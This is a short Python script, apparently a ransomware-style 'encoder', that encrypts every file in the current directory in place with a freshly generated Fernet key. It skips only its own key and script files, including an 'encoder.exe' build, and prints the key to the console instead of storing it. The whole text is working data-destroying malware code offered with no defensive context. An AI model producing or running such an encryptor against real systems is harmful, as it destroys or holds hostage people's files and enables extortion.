import os
from cryptography.fernet import Fernet
files=[]
for file in os.listdir():
    if file =="thekey.key" or file=="encoder.py"or file=="decoder.py"or file=="encoder.exe":
        continue
    if os.path.isfile(file):
        files.append(file)
key=Fernet.generate_key()
print(key)
for f in files:
    with open(f,"rb") as thefile:
        contents=thefile.read()
        contents_encrypted=Fernet(key).encrypt(contents)
    with open(f,"wb") as thefile:
        thefile.write(contents_encrypted)